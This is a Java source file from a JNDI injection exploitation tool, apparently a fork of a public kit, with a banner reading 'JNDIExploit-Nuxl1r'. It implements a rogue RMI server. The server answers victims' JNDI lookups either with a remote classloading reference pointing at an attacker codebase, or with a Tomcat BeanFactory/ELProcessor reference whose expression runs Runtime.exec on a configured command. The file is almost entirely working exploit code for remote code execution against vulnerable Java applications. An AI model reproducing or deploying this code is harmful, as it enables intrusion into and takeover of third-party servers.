package com.feihong.ldap;


import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;
import java.util.Set;
import java.util.TreeMap;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;

import com.feihong.ldap.controllers.LdapController;
import com.feihong.ldap.controllers.LdapMapping;
import com.feihong.ldap.utils.Config;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import com.feihong.ldap.gadgets.utils.Reflections;
import org.apache.naming.ResourceRef;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import static org.fusesource.jansi.Ansi.ansi;


/**
 * Generic JRMP listener
 * <p>
 * JRMP Listener that will respond to RMI lookups with a Reference that specifies a remote object factory.
 * <p>
 * This technique was mitigated against by no longer allowing remote codebases in references by default in Java 8u121.
 *
 * @author mbechler
 */
@SuppressWarnings({
        "restriction"
})
public class RMIServer implements Runnable {

    private int port;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private URL classpathUrl;


    public RMIServer(int port, URL classpathUrl) throws IOException {
        this.port = port;
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }

    public boolean waitFor(int i) {
        try {
            if (this.hadConnection) {
                return true;
            }
            System.err.println("[+] Waiting for connection");
            synchronized (this.waitLock) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        } catch (InterruptedException e) {
            return false;
        }
    }


    /**
     *
     */
    public void close() {
        this.exit = true;
        try {
            this.ss.close();
        } catch (IOException e) {
        }
        synchronized (this.waitLock) {
            this.waitLock.notify();
        }
    }


    public static final void start() {
//        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
//            System.err.println(RMIRefServer.class.getName() + "<codebase_url#classname> [<port>]");
//            System.exit(-1);
//            return;
//        }
//        if ( args.length >= 2 ) {
//            port = Integer.parseInt(args[ 1 ]);
//        }
        String url = "http://" + Config.ip + ":" + Config.rmiPort;

        try {
            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI Server Start Listening on >> |@" + Config.rmiPort + "..."));
            RMIServer c = new RMIServer(Config.rmiPort, new URL(url));
            c.run();
        } catch (Exception e) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }


    @Override
    public void run() {
        try {
            @SuppressWarnings("resource")
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("[+] Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try (DataInputStream in = new DataInputStream(bufIn)) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                                s.close();
                                continue;
                            }

                            OutputStream sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                            try (DataOutputStream out = new DataOutputStream(bufOut)) {

                                byte protocol = in.readByte();
                                switch (protocol) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if (remote.getHostName() != null) {
                                            out.writeUTF(remote.getHostName());
                                        } else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out);
                                        break;
                                    default:
                                    case TransportConstants.MultiplexProtocol:
                                        System.err.println("Unsupported protocol");
                                        s.close();
                                        continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    } catch (InterruptedException e) {
                        return;
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    } finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            } finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }

        } catch (SocketException e) {
            return;
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID.read(in);
                break;

            default:
                throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (java.io.IOException e) {
            throw new MarshalException("unable to read objID", e);
        }

        if (read.hashCode() == 2) {
            // DGC
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            if (handleRMI(ois, out)) {
                this.hadConnection = true;
                synchronized (this.waitLock) {
                    this.waitLock.notifyAll();
                }
                return;
            }
        }

    }


    private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if (method != 2) { // lookup
            return false;
        }

        String base = (String) ois.readObject();
        System.out.println(ansi().eraseScreen().render(
                "   @|green █████\\|@ @|red ██\\   ██\\|@ @|yellow ███████\\|@  @|MAGENTA ██████\\|@       @|CYAN ██\\   ██\\ ██\\   ██\\|@ \n" +
                        "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.4.5|@\n" +
                        "      @|green ██ ||@@|red ████\\ ██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ████\\ ██ |██ |  ██ ||@ @|BG_CYAN JNDIExploit-Nuxl1r|@\n" +
                        "      @|green ██ ||@@|red ██ ██\\██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@██████\\ @|CYAN ██ ██\\██ |██ |  ██ ||@\n" +
                        "@|green ██\\   ██ ||@@|red ██ \\████ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@\\______|@|CYAN ██ \\████ |██ |  ██ ||@\n" +
                        "@|green ██ |  ██ ||@@|red ██ |\\███ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ██ |\\███ |██ |  ██ ||@\n" +
                        "@|green \\██████  ||@@|red ██ | \\██ ||@@|yellow ███████  ||@@|MAGENTA ██████\\|@       @|CYAN ██ | \\██ |\\██████  ||@\n" +
                        "@|green  \\______/|@@|red  \\__|  \\__||@@|yellow \\_______/|@ @|MAGENTA \\______||@      @|CYAN \\__|  \\__| \\______/|@"));
        System.out.println(ansi().render(Ltime.getLocalTime() + "@|bg_GREEN -----------------------------------------------------------------------------------|@"));
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Is RMI.lookup call for >> |@" + base + " " + method));

        InMemoryInterceptedSearchResult result = null;
        LdapController controller = null;
        //find controller
        //根据请求的路径从route中匹配相应的controller
        for (String key : LdapServer.routes.keySet()) {
            //compare using wildcard at the end
            if (base.toLowerCase().startsWith(key)) {
                controller = LdapServer.routes.get(key);
                break;
            }
        }

//        if (controller == null) {
//            System.out.println(ansi().render("@|red [!] Invalid RMI Query: |@" + base));
//            return false;
//        }
        URL turl = new URL(this.classpathUrl + "#" + base);
        out.writeByte(TransportConstants.Return);// transport op
        try (ObjectOutputStream oos = new MarshalOutputStream(out, turl)) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            //反射调用的类名
            ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);

            if (base.startsWith("jilt123")) {
                System.out.println("[+] Sending local classloading reference.");
                Reflections.setFieldValue(rw, "wrappee", execByEL());
            } else {
                System.err.println(
                        String.format(
                                "[+] Sending remote classloading stub targeting %s",
                                turl));

                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", turl.getRef(), turl.toString()));
            }
            Field refF = RemoteObject.class.getDeclaredField("ref");
            refF.setAccessible(true);
            refF.set(rw, new UnicastServerRef(12345));

            oos.writeObject(rw);

            oos.flush();
            out.flush();
        }
        return true;
    }

    public ResourceRef execByEL() {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                Config.command
        )));
        return ref;
    }


    /**
     * @param ois
     * @throws IOException
     * @throws ClassNotFoundException
     */
    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }


    @SuppressWarnings("deprecation")
    protected static Object makeDummyObject(String className) {
        try {
            ClassLoader isolation = new ClassLoader() {
            };
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[0];
        }
    }

    public static class Dummy implements Serializable {

        private static final long serialVersionUID = 1L;

    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private URL sendUrl;


        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }


        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }


        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";

                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
